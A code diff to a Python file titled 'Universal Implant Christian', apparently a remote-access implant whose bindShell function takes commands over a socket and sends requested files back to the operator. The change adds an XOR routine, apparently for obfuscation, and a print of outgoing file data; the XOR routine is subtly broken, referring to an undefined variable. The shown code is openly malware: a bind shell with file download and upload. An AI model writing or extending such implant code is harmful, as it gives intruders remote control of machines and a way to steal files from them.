@@ -6,6 +6,15 @@ import socket
 
 """Universal Implant Christian"""
 
+def xor(toxor: str, xorKey: str) -> bytes:
+    key = bytes(xorKey.encode("utf-8"))
+    charList = bytes(tochange.encode("utf-8"))
+    extended_key = key * (len(charList))
+    xord = []
+    for x in range(len(charList)):
+        xord.append(charList[x]^extended_key[x])
+
+    return bytes(xord)
 # upload
 def upload_file(b64_in: str, dest_file: str) -> None:
 
@@ -83,6 +92,7 @@ def bindShell() -> None:
                         fileDL_command = args[1]
                         fileDL_send = download_file(fileDL_command)
                         message = fileDL_send
+                        print(message)
                         conn.send(message)
 
                     # upload
